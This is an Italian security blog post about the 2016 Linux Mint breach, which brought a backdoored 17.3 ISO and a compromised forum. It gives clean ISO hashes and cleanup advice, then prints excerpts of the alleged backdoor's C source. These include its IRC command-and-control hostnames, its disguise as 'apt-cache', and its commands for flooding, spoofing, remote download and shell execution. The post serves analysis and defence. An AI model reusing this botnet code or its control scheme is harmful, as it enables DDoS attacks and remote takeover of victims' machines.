---
layout: post
author: thesp0nge
title: "Linux Mint, la ISO intorno al buco"
promotion: "Linux Mint ha subito una compromissione e alcune delle sue ISO contengono una backdoor. "
modified: 
featured: false
category: [Spinaci]
tags: [linux, linux mint, backdoor, opensource, vulnerability warning]
image:
  feature: mint.jpg
comments: true
share: true
---

Nella giornata di ieri, sul blog della distribuzione [Linux
Mint](http://www.linuxmint.com), viene
[annunciato](http://blog.linuxmint.com/?p=2994) che a seguito di un'intrusione
subita nella stessa giornata del 21 Febbraio, è stato possibile per
l'attaccante modificare la ISO della versione 17.3 della distribuzione,
inserendo una backdoor al suo interno.

Cosa ha funzionato. Sicuramente la comunicazione chiara e trasparente.
Ammettere di avere un problema, significa avere a cuore i propri utenti.

> The hacked ISOs are hosted on 5.104.175.212 and the backdoor connects to
> absentvodka.com.

Cosa non ha funzionato. Il loro programma di Vulnerability Management. Poi ci
sta, trovi l'attaccante bravo e succede che entra. Però se distribuisci una tua
distro Linux, i tuoi clienti si aspettano il top lato sicurezza informatica.

Comunque, dato che può succedere, se siete utilizzatori di questa distribuzione
Linux, controllate che l'MD5 dell'ISO installata sulle vostre macchine sia una
di queste:

{% highlight sh %}
6e7f7e03500747c6c3bfece2c9c8394f  linuxmint-17.3-cinnamon-32bit.iso
e71a2aad8b58605e906dbea444dc4983  linuxmint-17.3-cinnamon-64bit.iso
30fef1aa1134c5f3778c77c4417f7238  linuxmint-17.3-cinnamon-nocodecs-32bit.iso
3406350a87c201cdca0927b1bc7c2ccd  linuxmint-17.3-cinnamon-nocodecs-64bit.iso
df38af96e99726bb0a1ef3e5cd47563d  linuxmint-17.3-cinnamon-oem-64bit.iso
{% endhighlight %}

In caso contrario, riformattate da zero la macchina e cambiate tutte le
password delle web application a cui avete acceduto da quando avete installato
l'ISO compromessa.

## E il forum

In un [secondo post](http://blog.linuxmint.com/?p=3001), si da notizia che
anche il [forum](http://forums.linuxmint.com) è stato compromesso. Sono stati
quindi interessati i seguenti dati degli utenti:

{% highlight sh %}
Your forums username
An encrypted copy of your forums password
Your email address
Any personal information you might have put in your signature/profile/etc…
Any personal information you might written on the forums (including private topics and private messages)
{% endhighlight %}

Dai commenti, di utenti preoccupati, sembrerebbe esserci sempre lui di mezzo:
[WordPress](https://wordpress.org).

## La backdoor

Come da [post su Hacker News](https://news.ycombinator.com/item?id=11146257),
questo sarebbe il presunto [codice sorgente in
C](https://gist.github.com/thesp0nge/9f4ac5235b709c563e24) della backdoor
introdotta nella ISO di Mint.

Diciamo che è solo presunto, in quanto la segnalazione viene da un pentester di
Perth, tale [Anthony Cozamanis](https://www.linkedin.com/in/acozamanis) e non
ho capito il legame tra lui, la distribuzione e l'attacco.

Si parte subito molto bene. Definisco un po' di costanti che mi fanno
immaginare che si vada a parare nel territorio dei server IRC.

{%highlight c%}
#define STARTUP 1
#undef IDENT// Only enable this if you absolutely have to
#define FAKENAME "apt-cache"// What you want this to hide as
#define CHAN "#mint"// Channel to join
#define KEY "bleh"  // The key of the channel
int numservers=5; // Must change this to equal number of servers down there
char *servers[] = {
  "updates.absentvodka.com",
  "updates.mintylinux.com",
  "eggstrawdinarry.mylittlerepo.com",
  "linuxmint.kernel-org.org",
  "updates.absentvodka.com",
  (void*)0
};
{% endhighlight %}

Nel main, troviamo ad un certo punto, la preparazione delle informazioni una
connessione IRC e una routine, _identd()_ che non fa altro che aprire sulla
macchina compromessa, un demone sulla porta 113, solitamente utilizzata da
[identd](https://en.wikipedia.org/wiki/Ident_protocol).


{% highlight c %}
  nick=makestring();
  ident=makestring();
  user=makestring();
  chan=CHAN;
  key=KEY;
  server=NULL;
  sa:
#ifdef IDENT
  for (i=0;i<numpids;i++) {
    if (pids[i] != 0 && pids[i] != getpid()) {
      kill(pids[i],9);
      waitpid(pids[i],NULL,WNOHANG);
    }
  }
 pids=NULL;
 numpids=0;
  identd();
#endif
  con();
{% endhighlight %}

In poche parole, l'host compromesso si connette ad uno dei server IRC
specificati all'inizio, e si trasforma in uno zombie. L'attaccante, usando il
protocollo IRC, invia i comandi ai suoi zombie per fare _cose brutte_.

{% highlight c %}
struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
  { "TSUNAMI", tsunami },
  { "PAN", pan },
  { "UDP", udp },
  { "UNKNOWN", unknown },
  { "NICK", nickc },
  { "SERVER", move },
  { "GETSPOOFS", getspoofs },
  { "SPOOFS", spoof },
  { "DISABLE", disable },
  { "ENABLE", enable },
  { "KILL", killd },
  { "GET", get },
  { "VERSION", version },
  { "KILLALL", killall },
  { "HELP", help },
{ (char *)0, (void (*)(int,char *,int,char **))0 } };
{% endhighlight %}

La backdoor viene fornita anche con un help molto parlante.

{% highlight c %}
void help(int sock, char *sender, int argc, char **argv) {
  if (mfork(sender) != 0) return;
  Send(sock,"NOTICE %s :TSUNAMI <target> <secs>                          = Special packeter that wont be blocked by most firewalls\n",sender); sleep(2);
  Send(sock,"NOTICE %s :PAN <target> <port> <secs>                       = An advanced syn flooder that will kill most network drivers\n",sender); sleep(2);
  Send(sock,"NOTICE %s :UDP <target> <port> <secs>                       = A udp flooder\n",sender); sleep(2);
  Send(sock,"NOTICE %s :UNKNOWN <target> <secs>                          = Another non-spoof udp flooder\n",sender); sleep(2);
  Send(sock,"NOTICE %s :NICK <nick>                                      = Changes the nick of the client\n",sender); sleep(2);
  Send(sock,"NOTICE %s :SERVER <server>                                  = Changes servers\n",sender); sleep(2);
  Send(sock,"NOTICE %s :GETSPOOFS                                        = Gets the current spoofing\n",sender); sleep(2);
  Send(sock,"NOTICE %s :SPOOFS <subnet>                                  = Changes spoofing to a subnet\n",sender); sleep(2);

  Send(sock,"NOTICE %s :DISABLE                                          = Disables all packeting from this client\n",sender); sleep(2);
  Send(sock,"NOTICE %s :ENABLE                                           = Enables all packeting from this client\n",sender); sleep(2);

  Send(sock,"NOTICE %s :KILL                                             = Kills the client\n",sender); sleep(2);
  Send(sock,"NOTICE %s :GET <http address> <save as>                     = Downloads a file off the web and saves it onto the hd\n",sender); sleep(2);
  Send(sock,"NOTICE %s :VERSION                                          = Requests version of client\n",sender); sleep(2);
  Send(sock,"NOTICE %s :KILLALL                                          = Kills all current packeting\n",sender); sleep(2);
  Send(sock,"NOTICE %s :HELP                                             = Displays this\n",sender);

  Send(sock,"NOTICE %s :IRC <command>                                    = Sends this command to the server\n",sender); sleep(2);
  Send(sock,"NOTICE %s :SH <command>                                     = Executes a command\n",sender); sleep(2);
  exit(0);
}
{% endhighlight %}

Una mitigazione fast & furious se pensate di avere delle Mint Linux installate
e compromesse nelle vostre reti?

Bloccate sui firewall perimetrali il traffico in uscita, verso gli host:

* updates.absentvodka.com
* updates.mintylinux.com
* eggstrawdinarry.mylittlerepo.com
* linuxmint.kernel-org.org
* updates.absentvodka.com

## Off by one

Questo incidente cosa ci deve insegnare? Da nuova benzina alla polemica open vs
closed sui temi di sicurezza? No, niente di tutto questo. Deve insegnare, che
quando metto online una serie di servizi, devo trattarli tutti con la stessa
attenzione, applicando politiche di sicurezza e hardening, facendo i dovuti
test del caso e applicando le patch.

Sono nozioni che ormai vengono ripetute allo sfinimento. Qualcuno le seguirà
mai?

Enjoy it.
